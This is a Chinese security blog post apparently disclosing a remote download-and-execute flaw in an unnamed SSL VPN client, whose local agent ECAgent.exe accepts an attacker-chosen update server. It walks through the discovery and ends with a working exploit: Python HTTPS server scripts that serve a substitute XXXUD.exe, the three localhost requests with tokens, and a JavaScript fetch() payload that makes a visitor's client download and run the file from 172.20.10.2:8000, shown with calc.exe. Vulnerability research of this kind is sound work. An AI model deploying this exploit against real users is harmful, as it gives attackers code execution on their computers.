<!DOCTYPE html> <html lang="en"> <head> <meta charset="utf-8"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <meta name="viewport" content="width=device-width, initial-scale=1" /> <title>某VPN客户端远程下载文件执行挖掘 · Chen's Blog</title> <meta name="description" content="VPN客户端远程下载文件执行挖掘"> <link rel="icon" href="http://localhost:4000/assets/favicon.png"> <link rel="apple-touch-icon" href="http://localhost:4000/assets/touch-icon.png"> <link rel="stylesheet" href="http://localhost:4000/assets/core.css"> <link rel="canonical" href="http://localhost:4000/archives/2021-05-05/1"> <link rel="alternate" type="application/atom+xml" title="Chen's Blog" href="http://localhost:4000/feed.xml" /> <link href="/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" media="all" /> <script> var _hmt = _hmt || []; (function() { var hm = document.createElement("script"); hm.src = "https://hm.baidu.com/hm.js?e4a42a371cc5994ee02b940034c29658"; var s = document.getElementsByTagName("script")[0]; s.parentNode.insertBefore(hm, s); })(); </script> </head> <body> <aside class="logo"> <a href="http://localhost:4000/"> <img src="/assets/avatar.jpg" class="logo-avatar"> </a> <span class="logo-prompt code">Back to Index</span> </aside> <article> <h1 class="title">ᴀᴜᴛʜᴏʀ: ᴠᴜʟᴋᴇʏ_ᴄʜᴇɴ</h1> <div class="divider"></div> <center><a href="/about" target="_blank">ᴀʙᴏᴜᴛ</a> | <a href="/links" target="_blank">ʟɪɴᴋs</a> | <a href="/AssistTool" target="_blank">ᴀssɪsᴛ ᴛᴏᴏʟ</a> | <a href="/Binary-Learning" target="_blank">ʙɪɴᴀʀʏ ʟᴇᴀʀɴɪɴɢ</a></center> <div class="divider"></div> </article> <div id="content"> <article> <div class="center"> <h1 class="title">某VPN客户端远程下载文件执行挖掘</h1> <time class="code">May 5, 2021</time> </div> <div class="divider"></div> <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&auto=1&id=1827600686&height=66"></iframe> <h1 id="vpn客户端远程下载文件执行挖掘">VPN客户端远程下载文件执行挖掘</h1> <h2 id="前言">前言</h2> <p>随便找一个地方下载VPN客户端下载安装。</p> <p>安装完之后访问VPN的页面，发现VPN会自动下载组件更新：</p> <p><img src="https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2021-05-05/2021-03-23_11-56-10.png" alt="2021-03-23_11-56-10" /></p> <p>这之间也许是因为存在着某些联系，可以深入的看一下。</p> <h2 id="对本地的访问">对本地的访问</h2> <p>重现上述问题，通过<code class="language-plaintext highlighter-rouge">F12</code>发现当访问VPN的登陆页面会对本地<code class="language-plaintext highlighter-rouge">127.0.0.1</code>进行HTTP(s)请求：</p> <p><img src="https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2021-05-05/2021-03-23_11-58-09.png" alt="2021-03-23_11-58-09" /></p> <p>这些请求均为GET请求并附带着一些参数，我们把它一一列下来：</p> <p><img src="https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2021-05-05/2021-03-23_12-00-49.png" alt="2021-03-23_12-00-49" /></p> <p>本地来看一下这个<code class="language-plaintext highlighter-rouge">54530</code>端口对应的进程是什么：</p> <p><img src="https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2021-05-05/2021-03-23_12-03-28.png" alt="2021-03-23_12-03-28" /></p> <p>发现这个端口是ECAgent.exe开启的，寻找到对应进程文件所在位置：</p> <p><img src="https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2021-05-05/2021-03-23_12-04-46.png" alt="2021-03-23_12-04-46" /></p> <p>确认这是XXX SSLVPN的程序，那么就可以将两者联系到一起，访问VPN登录首页会触发对<code class="language-plaintext highlighter-rouge">127.0.0.1</code>的访问从而引起VPN进行组件更新。</p> <h2 id="更新地址可控">更新地址可控</h2> <p>通过以上的分析我们猜测了整个大致流程，但我们设想一下如果我们可以控制本地的更新指向我们的服务器，然后将更新的组件内容替换成恶意程序，当程序启动的时候就启动了恶意程序，这样我们可以拿到安装VPN客户端的使用者PC权限。</p> <p>再回到之前的本地链接列表，根据对英文的理解，参数op的值应该为其具体对应要执行的动作：</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>InitECAgent -&gt; 初始化
GetEncryptKey -&gt; 获取加密密钥
DoConfigure -&gt; 配置
CheckReLogin -&gt; 检查重新登录
CheckProxySetting -&gt; 检查代理设置
UpdateControls -&gt; 更新控制
DoQueryService -&gt; 查询服务
</code></pre></div></div> <p>第一个初始化的请求存在可控参数arg1：</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://127.0.0.1:54530/ECAgent/?op=InitECAgent&amp;arg1=vpn.hqu.edu.cn%20443&amp;callback=EA_cb10000
</code></pre></div></div> <p>参数<code class="language-plaintext highlighter-rouge">arg1=vpn.hqu.edu.cn%20443</code>，对应值也就是HOST+空格+端口的格式，看到这里基本上就会有一个思路，客户端更新控件是不是根据这个指定值向其发送请求更新的呢？我们可以只替换第一个初始化请求的arg1参数为<code class="language-plaintext highlighter-rouge">172.20.10.2 8000</code>，然后本地搭建一个HTTP服务：</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">python</span> <span class="o">-</span><span class="n">m</span> <span class="n">SimpleHTTPServer</span>
</code></pre></div></div> <p>其他的请求原封不动，依次请求一遍那一份URL列表（图为请求示例）：</p> <p><img src="https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2021-05-05/2021-03-23_14-05-09.png" alt="2021-03-23_14-05-09" /></p> <p>服务端成功收到请求，但是却出现了错误的提示：</p> <p><img src="https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2021-05-05/2021-03-23_14-03-15.png" alt="2021-03-23_14-03-15" /></p> <p>首先我们已经验证了自己的猜想，更新地址是自己可控的，客户端确实会向我们指定的服务端发送请求，但由于出现了错误我们不知道客户端访问了哪个文件，也不知道访问文件之后做了什么动作。</p> <h2 id="服务搭建">服务搭建</h2> <p>现在要做的就是搭建一个客户端可以正常访问的请求，通过这个错误大致可以知道，我搭建的服务端协议和客户端请求使用的协议不一致，本机抓个包发现客户端请求的是 HTTPS 协议，这就需要搭建一个 HTTPS 服务了。</p> <p>如下脚本基于Python库建立一个 HTTPS 服务：</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
</span>
<span class="kn">import</span> <span class="nn">BaseHTTPServer</span><span class="p">,</span> <span class="n">SimpleHTTPServer</span>
<span class="kn">import</span> <span class="nn">ssl</span>

<span class="n">httpd</span> <span class="o">=</span> <span class="n">BaseHTTPServer</span><span class="p">.</span><span class="n">HTTPServer</span><span class="p">((</span><span class="s">'0.0.0.0'</span><span class="p">,</span> <span class="mi">8000</span><span class="p">),</span> <span class="n">SimpleHTTPServer</span><span class="p">.</span><span class="n">SimpleHTTPRequestHandler</span><span class="p">)</span>
<span class="n">httpd</span><span class="p">.</span><span class="n">socket</span> <span class="o">=</span> <span class="n">ssl</span><span class="p">.</span><span class="n">wrap_socket</span> <span class="p">(</span><span class="n">httpd</span><span class="p">.</span><span class="n">socket</span><span class="p">,</span> <span class="n">certfile</span><span class="o">=</span><span class="s">'./server.pem'</span><span class="p">,</span> <span class="n">server_side</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
<span class="n">httpd</span><span class="p">.</span><span class="n">serve_forever</span><span class="p">()</span>
</code></pre></div></div> <p>搭建起一个 HTTPS 环境后再次复现如上请求，服务端收到日志：</p> <p><img src="https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2021-05-05/2021-03-23_18-03-36.png" alt="2021-03-23_18-03-36" /></p> <p>可以看见客户端会访问两个文件：</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/com/WindowsModule.xml
/com/win/XXXUD.exe
</code></pre></div></div> <p>先不管xml文件是怎么样的，可执行文件(exe)是需要重视的，但是这里通过提示可以看出客户端发出的请求是POST请求，但我们所写的Python脚本建立的HTTPS服务并不支持POST方法，我们需要重写一下Handler：</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">BaseHTTPServer</span>
<span class="kn">import</span> <span class="nn">SimpleHTTPServer</span>
<span class="kn">import</span> <span class="nn">cgi</span>
<span class="kn">import</span> <span class="nn">ssl</span>

<span class="k">class</span> <span class="nc">ServerHandler</span><span class="p">(</span><span class="n">SimpleHTTPServer</span><span class="p">.</span><span class="n">SimpleHTTPRequestHandler</span><span class="p">):</span>
    <span class="k">def</span> <span class="nf">do_POST</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="n">form</span> <span class="o">=</span> <span class="n">cgi</span><span class="p">.</span><span class="n">FieldStorage</span><span class="p">()</span>
        <span class="n">SimpleHTTPServer</span><span class="p">.</span><span class="n">SimpleHTTPRequestHandler</span><span class="p">.</span><span class="n">do_GET</span><span class="p">(</span><span class="bp">self</span><span class="p">)</span>

<span class="n">Handler</span> <span class="o">=</span> <span class="n">ServerHandler</span>

<span class="n">httpd</span> <span class="o">=</span> <span class="n">BaseHTTPServer</span><span class="p">.</span><span class="n">HTTPServer</span><span class="p">((</span><span class="s">'0.0.0.0'</span><span class="p">,</span> <span class="mi">8000</span><span class="p">),</span> <span class="n">Handler</span><span class="p">)</span>
<span class="n">httpd</span><span class="p">.</span><span class="n">socket</span> <span class="o">=</span> <span class="n">ssl</span><span class="p">.</span><span class="n">wrap_socket</span> <span class="p">(</span><span class="n">httpd</span><span class="p">.</span><span class="n">socket</span><span class="p">,</span> <span class="n">certfile</span><span class="o">=</span><span class="s">'./server.pem'</span><span class="p">,</span> <span class="n">server_side</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
<span class="n">httpd</span><span class="p">.</span><span class="n">serve_forever</span><span class="p">()</span>
</code></pre></div></div> <p>最终如上脚本支持<code class="language-plaintext highlighter-rouge">POST</code>方法，当时用<code class="language-plaintext highlighter-rouge">POST</code>方法请求时即返回文件内容。</p> <p>最后，拖一个<code class="language-plaintext highlighter-rouge">calc.exe</code>（计算器）到HTTPS网站根目录下的<code class="language-plaintext highlighter-rouge">/com/win/XXXUD.exe</code>。</p> <p>依次请求（<strong>经过多次复现发现，这三个请求才是重点的，其他的可以忽略</strong>）：</p> <div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">https://127.0.0.1:54530/ECAgent/?op=InitECAgent&amp;arg1=172.20.10.2 8000&amp;callback=EA_cb10000

https://127.0.0.1:54530/ECAgent/?op=CheckReLogin&amp;arg1=3408a894633162c62188f98e92a221967dccfa5aafbd79b576714b4d1c392a4ad4b220d698efcd939c3b1b37467023e9380ee3abf0e492ee2efc736de757b80e973fe4c7d8af1af211a3f7ff3433cd9de975c76583efe7251dd1c0656f4384832998630359b65beb131cd8d287712462fa1b9e9acbc96dcc678b84cd57178c1a&amp;token=50065256e83ff1bb9e01757d0d22b669&amp;callback=EA_cb10003

https://127.0.0.1:54530/ECAgent/?op=UpdateControls&amp;arg1=BEFORELOGIN&amp;callback=EA_cb10005
</span></code></pre></div></div> <p>会发现客户端请求之后，将文件下载到本地并启动该程序，成功弹出计算器：</p> <p><img src="https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2021-05-05/2021-03-23_18-12-55.png" alt="2021-03-23_18-12-55" /></p> <h2 id="exploit实现">Exploit实现</h2> <p>Exploit很简单，当用户打开某个页面时访问那三个本地请求即可，这里使用JavaScript的fetch去实现即可：</p> <div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span>
	<span class="c1">// 服务器IP和端口</span>
	<span class="kd">var</span> <span class="nx">ip</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">172.20.10.2</span><span class="dl">"</span><span class="p">;</span>
	<span class="kd">var</span> <span class="nx">port</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">8000</span><span class="dl">"</span><span class="p">;</span>
	<span class="kd">var</span> <span class="nx">poc_list</span> <span class="o">=</span> <span class="p">[</span><span class="dl">"</span><span class="s2">https://127.0.0.1:54530/ECAgent/?op=InitECAgent&amp;arg1=</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">ip</span> <span class="o">+</span> <span class="dl">"</span><span class="s2"> </span><span class="dl">"</span> <span class="o">+</span> <span class="nx">port</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">&amp;Guid=&amp;callback=EA_cb10000</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">https://127.0.0.1:54530/ECAgent/?op=CheckReLogin&amp;arg1=3616f5b2ad1fe9b62b3d34509daa11259782919108eb2bebe59d64c808c3a079c6f6ae36b6ff1d63cb8067d08a9db72b70d912bfdb8bdc6ca18140cfa0ffb9e88b85acebf4bf544f71ff0fc662b9b95a8e939928b847018c106e1a96686e1ec3274a89ae0b8f77fc3d53a5ce0f1eec9a0ce8a5e4e2c927331cd94a67d5360a3e&amp;token=c4202416e283e60809d3b1e04e4bae6b&amp;Guid=&amp;callback=EA_cb10003</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">https://127.0.0.1:54530/ECAgent/?op=UpdateControls&amp;arg1=BEFORELOGIN&amp;Guid=&amp;callback=EA_cb10005</span><span class="dl">"</span><span class="p">];</span>
	<span class="k">for</span><span class="p">(</span><span class="kd">var</span> <span class="nx">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="nx">i</span><span class="o">&lt;</span><span class="nx">poc_list</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">){</span>
		<span class="nx">setTimeout</span><span class="p">(</span><span class="nx">fetch</span><span class="p">(</span><span class="nx">poc_list</span><span class="p">[</span><span class="nx">i</span><span class="p">]),</span><span class="dl">"</span><span class="s2">2000</span><span class="dl">"</span><span class="p">);</span>
		
	<span class="p">}</span>
<span class="o">&lt;</span><span class="sr">/script</span><span class="err">&gt;
</span></code></pre></div></div> <p>其次就是需要一个HTTPS服务端的Python脚本，并且在脚本根目录下的<code class="language-plaintext highlighter-rouge">/com/win/</code>目录下有一个<code class="language-plaintext highlighter-rouge">XXXUD.exe</code>文件。</p> <p><img src="https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2021-05-05/2021-03-23_18-17-02.png" alt="2021-03-23_18-17-02" /></p> </article> <div class="page-navigation code"> <a class="next" href="http://localhost:4000/archives/2021-07-01/1" title="NEXT: DOM Invader: 让DOM XSS的发现变得更加容易">&lt;&lt;</a> <span> &middot; </span> <a class="home" href="http://localhost:4000/" title="Back to Index">INDEX</a> <span> &middot; </span> <a class="prev" href="http://localhost:4000/archives/2020-11-22/1" title="PREV: 记一次攻防演习渗透过程">&gt;&gt;</a> </div> </div> <div class="footer"> <span class="block">&lt;/&gt; Copyright &copy; Chen's Blog (GH0ST.CN) 2016-2021</span> </div> <script src="/fancybox/lib/jquery-1.10.2.min.js"></script> <script type="text/javascript" src="/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script> <script> $(document).ready(function() { $("article img").each(function() { var strA = "<a style='text-decoration: none;' id='imgid' href='" + this.src + "'></a>"; $(this).wrapAll(strA); }); }); $("#imgid").fancybox({ openEffect : 'elastic', closeEffect : 'elastic', }); </script> </body> </html>
